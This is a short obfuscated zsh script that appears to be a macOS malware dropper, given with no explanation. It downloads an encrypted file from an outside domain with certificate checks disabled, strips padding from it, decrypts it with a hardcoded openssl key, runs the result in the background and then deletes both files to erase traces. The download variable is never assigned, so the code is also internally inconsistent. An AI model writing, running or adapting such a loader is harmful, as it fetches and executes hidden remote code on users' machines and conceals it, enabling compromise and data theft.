#!/bin/zsh
utfwr=$(mktemp /tmp/667gbn.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m362d886cd0ab126f.bin" -o "$utfwrz" || exit 1
gd472g=$(stat -f %z "$utfwrz"); ss3p6vn=$(( gd472g - 3925 - 3721 ))
tail -c +$(( 3925 + 1 )) "$utfwrz" | head -c $ss3p6vn | openssl enc -d -aes-256-cbc -k ac5c57f7af3476430fd709d0 -out "$utfwr" 2>/dev/null
[ -s "$utfwr" ] && chmod 700 "$utfwr" && ( "$utfwr" & ) && disown
( sleep 3; rm -f "$utfwr" "$utfwrz" ) &>/dev/null &
